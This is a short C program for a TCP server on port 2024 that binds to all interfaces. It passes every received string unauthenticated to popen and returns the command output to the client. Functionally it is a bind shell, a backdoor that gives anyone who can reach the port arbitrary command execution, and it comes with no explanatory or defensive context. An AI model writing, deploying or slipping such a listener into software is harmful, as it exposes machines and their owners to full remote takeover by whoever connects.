#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

#define PORT 2024

void process_command(int client_socket) {
    char buffer[4096];
    char command_output[4096];
    FILE *fp;

    // Zeroing buffers
    memset(buffer, 0, sizeof(buffer));
    memset(command_output, 0, sizeof(command_output));

    // Receive command
    if (recv(client_socket, buffer, sizeof(buffer), 0) < 0) {
        perror("recv");
        return;
    }

    // Execute command
    fp = popen(buffer, "r");
    if (fp == NULL) {
        printf("Failed to run command\n" );
        exit(1);
    }

    // Read the output
    while (fgets(command_output, sizeof(command_output), fp) != NULL) {
        send(client_socket, command_output, strlen(command_output), 0);
        memset(command_output, 0, sizeof(command_output)); // Clear buffer after sending
    }

    pclose(fp);
}

int main() {
    int server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t sin_len = sizeof(client_addr);

    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket < 0) {
        perror("socket");
        exit(1);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_socket, (struct sockaddr *) &server_addr, sizeof(server_addr)) == -1) {
        perror("bind");
        close(server_socket);
        exit(1);
    }

    listen(server_socket, 1);
    printf("Listening on port %d...\n", PORT);

    while (1) {
        client_socket = accept(server_socket, (struct sockaddr *) &client_addr, &sin_len);
        if (client_socket == -1) {
            perror("accept");
            continue;
        }

        printf("Got connection...\n");

        process_command(client_socket);

        close(client_socket);
        printf("Connection closed.\n");
    }
    return 0;
}
